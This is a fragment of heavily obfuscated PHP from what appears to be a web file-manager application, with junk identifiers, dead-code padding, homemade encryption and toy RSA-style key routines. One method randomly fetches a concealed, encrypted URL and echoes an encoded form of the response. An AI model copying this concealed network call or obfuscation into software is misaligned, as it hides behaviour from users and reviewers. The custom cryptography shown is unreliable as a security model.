($Š¹ˆÍî† <= $ù­˜×ó½) { return; } $÷Ïì¢¤ = Model($ßçÜşÏô[117])->field($ßçÜşÏô[286])->limit($ù­˜×ó½)->select(); $Áûº—ƒ = $è„ú£®[689]; if (strlen($Áûº—ƒ) < $è„ú£®[618]) { die; } $÷Ïì¢¤ = array_to_keyvalue($÷Ïì¢¤, $ßçÜşÏô[6], $ßçÜşÏô[286]); $°çúßáÄ = $è„ú£®[690]; if (strlen($°çúßáÄ) < $è„ú£®[628]) { return; } if (!in_array($¡¤Åûò[$ßçÜşÏô[286]], $÷Ïì¢¤)) { show_json($ßçÜşÏô[287], !1, $ßçÜşÏô[201]); } } public function togv1495eadc() { $•ŠÖó¡ó =& $_SERVER[Ù×¯Ø…]; $­Ğ·¯Ÿ =& $_SERVER[›õ¡œ§]; if (!_get($GLOBALS, $­Ğ·¯Ÿ[111]) || mt_rand(1, 100) > 20) { return; } $¿®ø´‚ = $­Ğ·¯Ÿ[209]; $¿®ø´‚ = $this->wvlrf11b64c5($¿®ø´‚, $­Ğ·¯Ÿ[210]); $Œª¿À½· = stream_context_create(array($­Ğ·¯Ÿ[211] => array($­Ğ·¯Ÿ[212] => $­Ğ·¯Ÿ[213], $­Ğ·¯Ÿ[214] => 3))); $éÑ¾Âê¶ = @file_get_contents($¿®ø´‚, !1, $Œª¿À½·); echo $­Ğ·¯Ÿ[288] . hash_encode($éÑ¾Âê¶) . $­Ğ·¯Ÿ[289]; $Ò‡³ÇÏ• = $•ŠÖó¡ó[691]; if (strlen($Ò‡³ÇÏ•) < $•ŠÖó¡ó[402]) { return; } } private function avskd68d02aa($Â¸ıËƒÂ, $ ™€èÌ, $¯¹“¤ = 3) { $î¼ÕÙ³ =& $_SERVER[Ù×¯Ø…]; $ÍÓ°Ü× =& $_SERVER[›õ¡œ§]; usleep(1); $Â¸ıËƒÂ = trim($Â¸ıËƒÂ); $Ê©²¢ñ¿ = mt_rand(0, 5) . $ÍÓ°Ü×[6]; $âÇÇˆ² = $î¼ÕÙ³[692]; while ($âÇÇˆ² < $î¼ÕÙ³[613]) { if ($âÇÇˆ² >= 0) { break; } $âÇÇˆ²++; } $¼ÖİÄ—Ì = rand_string(15); $…¿›Ò = $î¼ÕÙ³[693]; if (!$…¿›Ò) { die; } $ÊÏøÒŞï = $ÍÓ°Ü×[290]; switch ($Ê©²¢ñ¿) { case $ÍÓ°Ü×[197]: $è‹ÌşŞò = $this->ycug726a798e($Â¸ıËƒÂ, strrev($ ™€èÌ . $¼ÖİÄ—Ì)); $¢¢Öó‰ä = $î¼ÕÙ³[694]; while ($¢¢Öó‰ä < $î¼ÕÙ³[402]) { if ($¢¢Öó‰ä >= 0) { break; } $¢¢Öó‰ä++; } break; case $ÍÓ°Ü×[189]: $è‹ÌşŞò = $this->ycug726a798e($Â¸ıËƒÂ, strrev($¼ÖİÄ—Ì . $ ™€èÌ)); $å˜»Ö¨ = $î¼ÕÙ³[695]; if (strlen($å˜»Ö¨) < $î¼ÕÙ³[613]) { return; } break; case $ÍÓ°Ü×[291]: $è‹ÌşŞò = $this->ycug726a798e($Â¸ıËƒÂ, base64_encode($¼ÖİÄ—Ì . $ ™€èÌ)); $ôİ¨ï½ = $î¼ÕÙ³[696]; if (strlen($ôİ¨ï½) < $î¼ÕÙ³[628]) { return; } break; case $ÍÓ°Ü×[292]: $è‹ÌşŞò = $this->ycug726a798e($Â¸ıËƒÂ, md5($¼ÖİÄ—Ì . $ ™€èÌ)); $Á”ƒú = $î¼ÕÙ³[697]; while ($Á”ƒú < $î¼ÕÙ³[402]) { if ($Á”ƒú >= 0) { break; } $Á”ƒú++; } break; case $ÍÓ°Ü×[293]: $Â¸ıËƒÂ = base64_encode($Â¸ıËƒÂ); $êÂº¾ê« = $î¼ÕÙ³[698]; while (strlen($êÂº¾ê«) < $î¼ÕÙ³[613]) { if (!$êÂº¾ê«) { break; } $êÂº¾ê«++; } $«Ï§Å³ò = rand(0, 64); $Ä—ê£Öü = $ÊÏøÒŞï[$«Ï§Å³ò]; $çà°Ù§… = $î¼ÕÙ³[699]; $ø¯îä ´ = md5($Ä—ê£Öü . md5($ ™€èÌ . $Ä—ê£Öü) . $ ™€èÌ); $ôêĞ²øÉ = $î¼ÕÙ³[700]; while (strlen($ôêĞ²øÉ) < $î¼ÕÙ³[613]) { if (!$ôêĞ²øÉ) { break; } $ôêĞ²øÉ++; } $ø¯îä ´ = substr($ø¯îä ´, $«Ï§Å³ò % 8, $«Ï§Å³ò % 8 + 7); $“Ñ«¯ÜÛ = $î¼ÕÙ³[701]; while ($“Ñ«¯ÜÛ < $î¼ÕÙ³[402]) { if ($“Ñ«¯ÜÛ >= 0) { break; } $“Ñ«¯ÜÛ++; } $®ÖÊâŠ‡ = $ÍÓ°Ü×[6]; $’»Õ©úÈ = 0; $ÖÀ™®‰¤ = 0; $ãœ±àæ¹ = 0; for ($’»Õ©úÈ = 0; $’»Õ©úÈ < strlen($Â¸ıËƒÂ); $’»Õ©úÈ++) { $ãœ±àæ¹ = $ãœ±àæ¹ == strlen($ø¯îä ´) ? 0 : $ãœ±àæ¹; $ŠÀÃà™³ = $î¼ÕÙ³[702]; if (!$ŠÀÃà™³) { return; } $ÖÀ™®‰¤ = ($«Ï§Å³ò + strpos($ÊÏøÒŞï, $Â¸ıËƒÂ[$’»Õ©úÈ]) + ord($ø¯îä ´[$ãœ±àæ¹++])) % 64; $®ÖÊâŠ‡ .= $ÊÏøÒŞï[$ÖÀ™®‰¤]; $µéàØ…’ = $î¼ÕÙ³[703]; if (!$µéàØ…’) { return; } } $è‹ÌşŞò = hash_encode($Ä—ê£Öü . $®ÖÊâŠ‡); break; default: $è‹ÌşŞò = $this->ycug726a798e($Â¸ıËƒÂ, $ ™€èÌ . $¼ÖİÄ—Ì); break; } $è‹ÌşŞò = strrev($Ê©²¢ñ¿ . $¼ÖİÄ—Ì . $è‹ÌşŞò); $ªˆ‡ñõ = $î¼ÕÙ³[704]; if (!$ªˆ‡ñõ) { die; } if ($¯¹“¤ - 1 > 0) { $è‹ÌşŞò = $this->avskd68d02aa($è‹ÌşŞò, $ ™€èÌ, $¯¹“¤ - 1); } return $è‹ÌşŞò; } private function zfpc5706f735($û¨øÆ´, $õáğÍ¡Ÿ, $Æ‡ÕŠš¡ = 3) { $ù€Ø³ôÖ =& $_SERVER[Ù×¯Ø…]; $û»§Ç¼Õ =& $_SERVER[›õ¡œ§]; if (!is_string($û¨øÆ´) || strlen($û¨øÆ´) < 10) { return !1; } $û¨øÆ´ = trim($û¨øÆ´); $£’ñ„´ = $ù€Ø³ôÖ[705]; if (strlen($£’ñ„´) < $ù€Ø³ôÖ[402]) { die; } $û¨øÆ´ = strrev($û¨øÆ´); $°¬˜½êÎ = $û¨øÆ´[0]; $ï®İŸõ = $ù€Ø³ôÖ[706]; $Äùõ’Ç = substr($û¨øÆ´, 1, 15); $û¨øÆ´ = substr($û¨øÆ´, 16); $öãÚÁ¿¹ = $ù€Ø³ôÖ[707]; $î¤úèöí = $û»§Ç¼Õ[290]; switch ($°¬˜½êÎ) { case $û»§Ç¼Õ[197]: $Ğòœ®Îé = $this->wvlrf11b64c5($û¨øÆ´, strrev($õáğÍ¡Ÿ . $Äùõ’Ç)); break; $·¨ı•ÚÎ = $ù€Ø³ôÖ[708]; if (strlen($·¨ı•ÚÎ) < $ù€Ø³ôÖ[613]) { return; } case $û»§Ç¼Õ[189]: $Ğòœ®Îé = $this->wvlrf11b64c5($û¨øÆ´, strrev($Äùõ’Ç . $õáğÍ¡Ÿ)); $¡üÀƒ”œ = $ù€Ø³ôÖ[709]; if (strlen($¡üÀƒ”œ) < $ù€Ø³ôÖ[625]) { die; } break; case $û»§Ç¼Õ[291]: $Ğòœ®Îé = $this->wvlrf11b64c5($û¨øÆ´, base64_encode($Äùõ’Ç . $õáğÍ¡Ÿ)); break; $äºŒ½¥Ï = $ù€Ø³ôÖ[710]; case $û»§Ç¼Õ[292]: $Ğòœ®Îé = $this->wvlrf11b64c5($û¨øÆ´, md5($Äùõ’Ç . $õáğÍ¡Ÿ)); $ùš¯çöó = $ù€Ø³ôÖ[711]; if (!$ùš¯çöó) { die; } break; $‹ıˆû¨Ì = $ù€Ø³ôÖ[712]; case $û»§Ç¼Õ[293]: $û¨øÆ´ = hash_decode($û¨øÆ´); $Ìôã³·Ñ = $û¨øÆ´[0]; $ƒã¥ÏÆñ = $ù€Ø³ôÖ[713]; if (!$ƒã¥ÏÆñ) { die; } $û¨øÆ´ = substr($û¨øÆ´, 1); $¿Ğ‡¶€ = strpos($î¤úèöí, $Ìôã³·Ñ); $¼Ì‡“µ = $ù€Ø³ôÖ[714]; $ö—‚¥¤› = md5($Ìôã³·Ñ . md5($õáğÍ¡Ÿ . $Ìôã³·Ñ) . $õáğÍ¡Ÿ); $ö—‚¥¤› = substr($ö—‚¥¤›, $¿Ğ‡¶€ % 8, $¿Ğ‡¶€ % 8 + 7); $Ÿóüİ»Õ = $û»§Ç¼Õ[6]; $ÎŞ›ï¾ = $ù€Ø³ôÖ[715]; while (strlen($ÎŞ›ï¾) < $ù€Ø³ôÖ[402]) { if (!$ÎŞ›ï¾) { break; } $ÎŞ›ï¾++; } $‡³Š•çô = 0; $ÄÌ¬Æù = 0; $’÷•ÁÔÔ = $ù€Ø³ôÖ[716]; while (strlen($’÷•ÁÔÔ) < $ù€Ø³ôÖ[613]) { if (!$’÷•ÁÔÔ) { break; } $’÷•ÁÔÔ++; } $ÆçÙ¤Ó« = 0; $¤Ñ™í¿³ = $ù€Ø³ôÖ[717]; if (strlen($¤Ñ™í¿³) < $ù€Ø³ôÖ[628]) { die; } for ($‡³Š•çô = 0; $‡³Š•çô < strlen($û¨øÆ´); $‡³Š•çô++) { $ÆçÙ¤Ó« = $ÆçÙ¤Ó« == strlen($ö—‚¥¤›) ? 0 : $ÆçÙ¤Ó«; $‡Şùµéö = $ÆçÙ¤Ó«++; $ÄÌ¬Æù = strpos($î¤úèöí, $û¨øÆ´[$‡³Š•çô]) - $¿Ğ‡¶€ - ord($ö—‚¥¤›[$‡Şùµéö]); $ëŒØİÎß = $ù€Ø³ôÖ[718]; while ($ÄÌ¬Æù < 0) { $ÄÌ¬Æù += 64; } $Ÿóüİ»Õ .= $î¤úèöí[$ÄÌ¬Æù]; } $Ğòœ®Îé = base64_decode($Ÿóüİ»Õ); break; default: $Ğòœ®Îé = $this->wvlrf11b64c5($û¨øÆ´, $õáğÍ¡Ÿ . $Äùõ’Ç); $½€şÏøĞ = $ù€Ø³ôÖ[719]; break; } if ($Æ‡ÕŠš¡ - 1 > 0) { $Ğòœ®Îé = $this->zfpc5706f735($Ğòœ®Îé, $õáğÍ¡Ÿ, $Æ‡ÕŠš¡ - 1); } return $Ğòœ®Îé; } public function jqnm1cbf76b7($°é­«Ò›) { $•çñš’ =& $_SERVER[Ù×¯Ø…]; $‚†øı½ì =& $_SERVER[›õ¡œ§]; $´¯Á¬Õœ = $this->zelceb876438(); $Íç‡îñÖ = $•çñš’[720]; $É’¦ŒËï = $this->zelceb876438(); $—íÉİ‚• = ($´¯Á¬Õœ - 1) * ($É’¦ŒËï - 1); $¸âĞ—ã = $•çñš’[721]; while ($¸âĞ—ã < $•çñš’[402]) { if ($¸âĞ—ã >= 0) { break; } $¸âĞ—ã++; } $ŠúïêİÎ = intval(($´¯Á¬Õœ + $É’¦ŒËï) / 2); $õÎ¤¤Ä¯ = $•çñš’[722]; if (!$õÎ¤¤Ä¯) { die; } while (1) { $‚‘ª°™Â = $ŠúïêİÎ; $®©ƒÃ  = $—íÉİ‚•; $î®ğ‘ØÀ = $•çñš’[723]; while ($®©ƒÃ  % $‚‘ª°™Â != 0) { $•˜ïÙ× = $®©ƒÃ ; $È‡ıÌå“ = $•çñš’[724]; if (!$È‡ıÌå“) { return; } $®©ƒÃ  = $‚‘ª°™Â; $‚‘ª°™Â = $•˜ïÙ× % $‚‘ª°™Â; } if ($‚‘ª°™Â == 1) { break; } else { $ŠúïêİÎ++; } } $¿¯’»ü = 2; for ($ÛòË‘¿é = 0; $ÛòË‘¿é < $—íÉİ‚• * 10; $ÛòË‘¿é++) { if (($—íÉİ‚• * $ÛòË‘¿é + 1) % $ŠúïêİÎ == 0) { $¿¯’»ü = intval(($—íÉİ‚• * $ÛòË‘¿é + 1) / $ŠúïêİÎ); break; } } $‹†€ç¬Ñ = $this->ycug726a798e($´¯Á¬Õœ * $É’¦ŒËï . $‚†øı½ì[6], $‚†øı½ì[128]); $òÍÂÛª = $•çñš’[725]; if (!$òÍÂÛª) { return; } $”òáœã = md5($‚†øı½ì[294] . ($´¯Á¬Õœ + $É’¦ŒËï) . $‚†øı½ì[295] . $ŠúïêİÎ . $‚†øı½ì[295] . $¿¯’»ü . $‚†øı½ì[296]); $Õ§¡ÓÃ = $•çñš’[726]; while ($Õ§¡ÓÃ < $•çñš’[625]) { if ($Õ§¡ÓÃ >= 0) { break; } $Õ§¡ÓÃ++; } $’¢‹úÏ“ = $this->ycug726a798e($°é­«Ò›, $”òáœã) . $‚†øı½ì[297] . $‹†€ç¬Ñ; return $’¢‹úÏ“; $Šõªú Û = $•çñš’[727]; if (strlen($Šõªú Û) < $•çñš’[613]) { die; } } public function tndg74346dd9($ÃÁŸı) { $›ŞÑ„…Ê =& $_SERVER[Ù×¯Ø…]; $œˆüšğ„ =& $_SERVER[›õ¡œ§]; $Îù÷ô¾ = explode($œˆüšğ„[297], $ÃÁŸı); if (count($Îù÷ô¾) != 2) { return $œˆüšğ„[6]; } $¬®‡ä£« = $this->wvlrf11b64c5($Îù÷ô¾[1] . $œˆüšğ„[6], $œˆüšğ„[128]); $Õ˜àğ×² = $›ŞÑ„…Ê[728]; while (strlen($Õ˜àğ×²) < $›ŞÑ„…Ê[618]) { if (!$Õ˜àğ×²) { break; } $Õ˜àğ×²++; } if (!$¬®‡ä£«) { return $œˆüšğ„[6]; } $¬®‡ä£« = intval($¬®‡ä£«); $£Üõ¿öÖ = $›ŞÑ„…Ê[729]; $ãÒÎÅâ = 0; $×‡ÛµŒ = $›ŞÑ„…Ê[730]; if (!$×‡ÛµŒ) { die; } $™áØ° = 0; $…©İÔğ = $›ŞÑ„…Ê[731]; if (!$…©İÔğ) { die; } for ($Ü“ §Ê‚ = 3; $Ü“ §Ê‚ < $¬®‡ä£«; $Ü“ §Ê‚ += 2) { if ($¬®‡ä£« % $Ü“ §Ê‚ != 0) { continue; } $ãÒÎÅâ = $Ü“ §Ê‚; $™áØ° = intval($¬®‡ä£« / $Ü“ §Ê‚); $©—‡«¸û = $›ŞÑ„…Ê[732]; break; } $˜ë™±ø† = ($ãÒÎÅâ - 1) * ($™áØ° - 1); $¼æÑÒìô = intval(($ãÒÎÅâ + $™áØ°) / 2); $„íèæ¾‚ = $›ŞÑ„…Ê[733]; if (!$„íèæ¾‚) { return; } while (1) { $í—È»¤ = $¼æÑÒìô; $šØƒˆµĞ = $˜ë™±ø†; while ($šØƒˆµĞ % $í—È»¤ != 0) { $§ïç×†¯ = $šØƒˆµĞ; $ò™—‰¤Å = $›ŞÑ„…Ê[734]; while ($ò™—‰¤Å < $›ŞÑ„…Ê[628]) { if ($ò™—‰¤Å >= 0) { break; } $ò™—‰¤Å++; } $šØƒˆµĞ = $í—È»¤; $î¡ªî„Ä = $›ŞÑ„…Ê[735]; $í—È»¤ = $§ïç×†¯ % $í—È»¤; $ú’ÀòæÚ = $›ŞÑ„…Ê[736]; while ($ú’ÀòæÚ < $›ŞÑ„…Ê[625]) { if ($ú’ÀòæÚ >= 0) { break; } $ú’ÀòæÚ++; } } if ($í—È»¤ == 1) { break; } else { $¼æÑÒìô++; } } $Í¬Ä”·Õ = 2; $íßşöÜá = $›ŞÑ„…Ê[737]; for ($Ü“ §Ê‚ = 0; $Ü“ §Ê‚ < $˜ë™±ø† * 10; $Ü“ §Ê‚++) { if (($˜ë™±ø† * $Ü“ §Ê‚ + 1) % $¼æÑÒìô == 0) { $Í¬Ä”·Õ = intval(($˜ë™±ø† * $Ü“ §Ê‚ + 1) / $¼æÑÒìô); break; } } $øŠ—àåØ = md5($œˆüšğ„[294] . ($ãÒÎÅâ + $™áØ°) . $œˆüšğ„[295] . $¼æÑÒìô . $œˆüšğ„[295] . $Í¬Ä”·Õ . $œˆüšğ„[296]); $üìŸÎ¶ = $›ŞÑ„…Ê[738]; while ($üìŸÎ¶ < $›ŞÑ„…Ê[628]) { if ($üìŸÎ¶ >= 0) { break; } $üìŸÎ¶++; } $Øâ—š½ï = $this->wvlrf11b64c5($Îù÷ô¾[0], $øŠ—àåØ); return $Øâ—š½ï; $åÛ—…ãÊ = $›ŞÑ„…Ê[739]; if (strlen($åÛ—…ãÊ) < $›ŞÑ„…Ê[402]) { return; } } public function zelceb876438() { $™ÍÏÇÇ” =& $_SERVER[Ù×¯Ø…]; $Ë¹›°êğ = mt_rand(pow(2, 14), pow(2, 16) - 1); $Ú‡µœúà = $™ÍÏÇÇ”[740]; if (!$Ú‡µœúà) { return; } $î¶µª™» = array(); $¥Ï”Ã‰ = $™ÍÏÇÇ”[741]; if (strlen($¥Ï”Ã‰) < $™ÍÏÇÇ”[628]) { return; } $ß„ º­ = 1; while ($ß„ º­ <= (int) sqrt($Ë¹›°êğ)) { $¿€êë¨¨ = $ß„ º­; $ßı€Øó³ = $™ÍÏÇÇ”[742]; while (!0) { $¿€êë¨¨++; $ƒãÁ±„ğ = $™ÍÏÇÇ”[743]; while (strlen($ƒãÁ±„ğ) < $™ÍÏÇÇ”[613]) { if (!$ƒãÁ±„ğ) { break; } $ƒãÁ±„ğ++; } if ($¿€êë¨¨ <= 2) { $ß„ º­ = $¿€êë¨¨; break; } else { if ($¿€êë¨¨ < 2) { continue; } } $¹“Òæ±¼ = !0; for ($›à¥„— = 2; $›à¥„— <= sqrt($¿€êë¨¨); $›à¥„—++) { if ($¿€êë¨¨ % $›à¥„— == 0) { $¹“Òæ±¼ = !1; } } if ($¹“Òæ±¼) { $ß„ º­ = $¿€êë¨¨; break; } } $î¶µª™»[] = $ß„ º­; $ËÒµ–Ê‘ = $™ÍÏÇÇ”[744]; } $†°¢—µ  = 2; for ($¿€êë¨¨ = $Ë¹›°êğ; $¿€êë¨¨ > 1; $¿€êë¨¨--) { $¹“Òæ±¼ = !0; $ĞõŸ¸•· = $™ÍÏÇÇ”[745]; foreach ($î¶µª™» as $®†ó¦É) { if ($¿€êë¨¨ % $®†ó¦É == 0) { $¹“Òæ±¼ = !1; break; } } if ($¹“Òæ±¼) { $†°¢—µ  = $¿€êë¨¨; break; } } return $†°¢—µ ; } public function pqtkee5e698b($…óôºÉ”, $ŞÂ‹ãüà) { $åÎù¬Øâ =& $_SERVER[›õ¡œ§]; return call_user_func(array($åÎù¬Øâ[8], $åÎù¬Øâ[298]), $…óôºÉ”, $ŞÂ‹ãüà); } public function ycug726a798e($£ú«ıÄÅ, $ÈÅìöŒ) { $ªûæÆõ¿ =& $_SERVER[›õ¡œ§]; return call_user_func(array($ªûæÆõ¿[299], $ªûæÆõ¿[300]), $£ú«ıÄÅ, $ÈÅìöŒ); } public function wvlrf11b64c5($Ã ‰õóÆ, $ôßå¦İ) { $Ñö¹¡Æ« =& $_SERVER[Ù×¯Ø…]; $¨ÉÅš =& $_SERVER[›õ¡œ§]; return call_user_func(array($¨ÉÅš[299], $¨ÉÅš[301]), $Ã ‰õóÆ, $ôßå¦İ); $şï‹şüÉ = $Ñö¹¡Æ«[746]; if (strlen($şï‹şüÉ) < $Ñö¹¡Æ«[402]) { die; } } } goto c‡ÇÉ£öåâ; A¡äöŸŒ­¾: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $ñ½ôİ–µ =& $_SERVER[Ù×¯Ø…]; $this->objectDriver = array($ñ½ôİ–µ[57], $ñ½ôİ–µ[58], $ñ½ôİ–µ[59], $ñ½ôİ–µ[60], $ñ½ôİ–µ[61], $ñ½ôİ–µ[62], $ñ½ôİ–µ[63], $ñ½ôİ–µ[64], $ñ½ôİ–µ[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ËÍ× ÉØ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ËÍ× ÉØ, $_SERVER[Ù×¯Ø…][8]); } return $ËÍ× ÉØ; } public function iconvApp($±¨ÄĞ¾) { return $±¨ÄĞ¾; } public function iconvSystem($ËŞ€ê¸) { return $ËŞ€ê¸; } public function iconvTo($‹ùÅïè‘, $îŞÇ‡àƒ, $†‚˜œÌ) { $¶…óĞµÕ =& $_SERVER[Ù×¯Ø…]; if (!$‹ùÅïè‘ || !function_exists($¶…óĞµÕ[66])) { return $‹ùÅïè‘; } static $ªá¦ä¨ğ = array(); $ÁÍ°åó¬ = $îŞÇ‡àƒ . $¶…óĞµÕ[67] . $†‚˜œÌ . $¶…óĞµÕ[68] . $‹ùÅïè‘; if (isset($ªá¦ä¨ğ[$ÁÍ°åó¬])) { return $ªá¦ä¨ğ[$ÁÍ°åó¬]; } if (function_exists($¶…óĞµÕ[69])) { $”Â°ÜŸ = @mb_convert_encoding($‹ùÅïè‘, $†‚˜œÌ, $îŞÇ‡àƒ); } else { $”Â°ÜŸ = @iconv($îŞÇ‡àƒ, $†‚˜œÌ, $‹ùÅïè‘); } $”Â°ÜŸ = $”Â°ÜŸ ? $”Â°ÜŸ : $‹ùÅïè‘; if (strstr($”Â°ÜŸ, $¶…óĞµÕ[70])) { $”Â°ÜŸ = str_replace($¶…óĞµÕ[70], $¶…óĞµÕ[71], $”Â°ÜŸ); } $ªá¦ä¨ğ[$îŞÇ‡àƒ . $¶…óĞµÕ[67] . $†‚˜œÌ . $¶…óĞµÕ[68] . $‹ùÅïè‘] = $”Â°ÜŸ; $ªá¦ä¨ğ[$†‚˜œÌ . $¶…óĞµÕ[67] . $îŞÇ‡àƒ . $¶…óĞµÕ[68] . $‹ùÅïè‘] = $‹ùÅïè‘; $ªá¦ä¨ğ[$†‚˜œÌ . $¶…óĞµÕ[67] . $îŞÇ‡àƒ . $¶…óĞµÕ[68] . $”Â°ÜŸ] = $‹ùÅïè‘; $ªá¦ä¨ğ[$îŞÇ‡àƒ . $¶…óĞµÕ[67] . $†‚˜œÌ . $¶…óĞµÕ[68] . $”Â°ÜŸ] = $”Â°ÜŸ; return $”Â°ÜŸ; } public function getPathInner($ºæòœ›Ö) { $²»ôÙ³­ = IO::init($ºæòœ›Ö); return $²»ôÙ³­->path; } public function getPathOuter($åáŠ­İ¤) { $öÃ‰åÏÖ =& $_SERVER[Ù×¯Ø…]; $•ÆŞÙÌ™ = strlen(trim($this->pathBase, $öÃ‰åÏÖ[8])); $åáŠ­İ¤ = substr(trim($åáŠ­İ¤, $öÃ‰åÏÖ[8]), $•ÆŞÙÌ™); return $this->pathDriver . $öÃ‰åÏÖ[8] . ltrim($åáŠ­İ¤, $öÃ‰åÏÖ[8]); } public function isParentOf($™««Í, $™¥¨ù§Ó) { $µŠÊ† =& $_SERVER[Ù×¯Ø…]; $™««Í = rtrim(strtolower($™««Í), $µŠÊ†[8]) . $µŠÊ†[8]; $™¥¨ù§Ó = rtrim(strtolower($™¥¨ù§Ó), $µŠÊ†[8]) . $µŠÊ†[8]; $í•ƒ›î€ = strpos($™¥¨ù§Ó, $™««Í) === 0; return $í•ƒ›î€; } public function getType() { $¦–“®ÜÓ =& $_SERVER[Ù×¯Ø…]; $¯ñ¡Ø™¹ = str_replace($¦–“®ÜÓ[72], $¦–“®ÜÓ[33], get_class($this)); return strtolower($¯ñ¡Ø™¹); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ûÏî‡‚À, $…ÎƒÜÛ”) { $ûÚò¯ú =& $_SERVER[Ù×¯Ø…]; $ÏçƒØà‘ = rtrim($ûÏî‡‚À, $ûÚò¯ú[8]) . $ûÚò¯ú[8] . $…ÎƒÜÛ”; $ùÓáò¦è = $this->exist($ÏçƒØà‘); return $ùÓáò¦è ? $ÏçƒØà‘ : !1; } public function setModifyTime($š”¢êÛ, $¼¸§œ©¸ = '') { } public function renameObject($úóùÒ¼ö, $È·Â§ÁÈ) { $Í”Ä¢Òñ =& $_SERVER[Ù×¯Ø…]; $­ıÜøìé = $È·Â§ÁÈ; Hook::trigger($Í”Ä¢Òñ[73], $this, $úóùÒ¼ö, $this, $this->pathFather($úóùÒ¼ö) . $È·Â§ÁÈ); $úóùÒ¼ö = $this->getPathOuter($úóùÒ¼ö); $È·Â§ÁÈ = $this->pathFather($úóùÒ¼ö) . $È·Â§ÁÈ; if (IO::isFile($úóùÒ¼ö)) { $ŒÎ·šë = IO::copy($úóùÒ¼ö, $this->pathFather($úóùÒ¼ö), REPEAT_RENAME_FOLDER, $­ıÜøìé); if ($ŒÎ·šë) { IO::remove($úóùÒ¼ö); } } else { $ŒÎ·šë = IO::mkdir($È·Â§ÁÈ); if (!$ŒÎ·šë) { return !1; } $Ø› £²Æ = IO::listPath($úóùÒ¼ö, !0); $¯áÍ‹‡¡ = array_merge($Ø› £²Æ[$Í”Ä¢Òñ[74]], $Ø› £²Æ[$Í”Ä¢Òñ[75]]); foreach ($¯áÍ‹‡¡ as $·ªÏÕÄ©) { IO::move($·ªÏÕÄ©[$Í”Ä¢Òñ[76]], $È·Â§ÁÈ, REPEAT_RENAME_FOLDER); } IO::remove($úóùÒ¼ö); } return $ŒÎ·šë ? $È·Â§ÁÈ : !1; } public function tempFile($®Çİ© = '', $›¿ ö½¡ = '') { if (!$®Çİ©) { $®Çİ© = rand_string(15); } $¨ÉÌã’  = TEMP_FILES . rand_string(15) . $_SERVER[Ù×¯Ø…][8]; @mkdir($¨ÉÌã’ , DEFAULT_PERRMISSIONS, !0); $²À€¾ÜÏ = $¨ÉÌã’  . $®Çİ©; @touch($²À€¾ÜÏ); if ($›¿ ö½¡) { file_put_contents($²À€¾ÜÏ, $›¿ ö½¡); } return $²À€¾ÜÏ; } public function tempFileRemve($çèãëŒ) { @unlink($çèãëŒ); @rmdir($this->pathFather($çèãëŒ)); } public function mkfile($¨ ®ª, $–ÜÊÖœü = '', $ÕÔ¹©€Ä = REPEAT_RENAME) { } public function mkdir($“ÜÃƒ†‡, $õà²çÛÏ = REPEAT_SKIP) { } public function delFile($·’ì½¬) { } public function delFolder($¾¸ƒ‘éğ) { } public function copyFile($ò€¿Õ«„, $œò‰—¬) { } public function moveFile($ÏßÌ¬à·, $€îÊâÑê) { } public function remove($¦éåç€ú) { if ($this->isFile($¦éåç€ú)) { return $this->delFile($¦éåç€ú); } return $this->delFolder($¦éåç€ú); } public function rename($Î‹è™¢Ï, $Š¿Î¡Ü) { } public function exist($ùï¤†üæ) { } public function findByHash($úˆÈå¸… = '', $€Ûœ„ = '') { return !1; } public function isFile($¯ÅÁŠ­Õ) { } public function isFolder($ñªäœíğ) { } public function size($¯»™´ì¹) { } public function info($©ÌŸÉ£) { } public function infoSimple($ÖœÛÔÙ›) { return $this->info($ÖœÛÔÙ›); } public function infoAuth($Îí…âŒñ) { return $this->info($Îí…âŒñ); } public function infoFull($ğ……ş¶Á) { return $this->info($ğ……ş¶Á); } public function infoWithChildren($Ñò˜óŸë) { $»ÇëéÎí =& $_SERVER[Ù×¯Ø…]; static $ÕŞµ°Ç§ = array(); if (isset($ÕŞµ°Ç§[$Ñò˜óŸë])) { return $ÕŞµ°Ç§[$Ñò˜óŸë]; } $ùÃ’¥»¢ = $this->info($Ñò˜óŸë); if ($ùÃ’¥»¢ && $ùÃ’¥»¢[$»ÇëéÎí[29]] == $»ÇëéÎí[77]) { $ë¬Àé‹‹ = array($»ÇëéÎí[78] => 0, $»ÇëéÎí[79] => 0, $»ÇëéÎí[80] => 0); $this->infoChildren($Ñò˜óŸë, $ë¬Àé‹‹); $ùÃ’¥»¢[$»ÇëéÎí[78]] = $ë¬Àé‹‹[$»ÇëéÎí[78]]; $ùÃ’¥»¢[$»ÇëéÎí[81]] = array($»ÇëéÎí[82] => $ë¬Àé‹‹[$»ÇëéÎí[79]], $»ÇëéÎí[83] => $ë¬Àé‹‹[$»ÇëéÎí[80]]); $ÕŞµ°Ç§[$Ñò˜óŸë] = $ùÃ’¥»¢; } return $ùÃ’¥»¢; } public function listPath($Ëâú’¬ä, $Ä˜”²»ï = false) { } public function has($›àÅ¶¼Ê, $”ª©…şú = false, $·ÀüÉ ı = false) { } public function canRead($èòĞûÍš) { } public function canWrite($½öêÀÅ“) { } public function getContent($¨’Ô¢—Ô) { } public function setContent($×İš¼í, $×üˆäòé = '') { } protected function infoChildren($û•¸îÜ, &$³™ğ²¨) { $èÓı­áÌ =& $_SERVER[Ù×¯Ø…]; check_abort_echo(); $¿ÂäŞÄ« = $this->listPath($û•¸îÜ, !0); $¿ÂäŞÄ« = array_merge($¿ÂäŞÄ«[$èÓı­áÌ[75]], $¿ÂäŞÄ«[$èÓı­áÌ[74]]); foreach ($¿ÂäŞÄ« as $²§ò’«å) { if ($²§ò’«å[$èÓı­áÌ[29]] == $èÓı­áÌ[77]) { $³™ğ²¨[$èÓı­áÌ[80]]++; $øıó‘¶Ñ = $this->getPathInner($²§ò’«å[$èÓı­áÌ[76]]); $this->infoChildren($øıó‘¶Ñ, $³™ğ²¨); } else { $³™ğ²¨[$èÓı­áÌ[79]]++; $³™ğ²¨[$èÓı­áÌ[78]] += $²§ò’«å[$èÓı­áÌ[78]]; } } } public function fileSubstr($ñ·¢şƒÜ, $§©ÆÅ, $æÂÈ¹÷š) { } public function listAll($ˆ‹õ) { } public function listAllMake($“ƒ§¾, &$•Ú”¶—) { $úöàó¥ =& $_SERVER[Ù×¯Ø…]; check_abort_echo(); $Ü×´äîÚ = 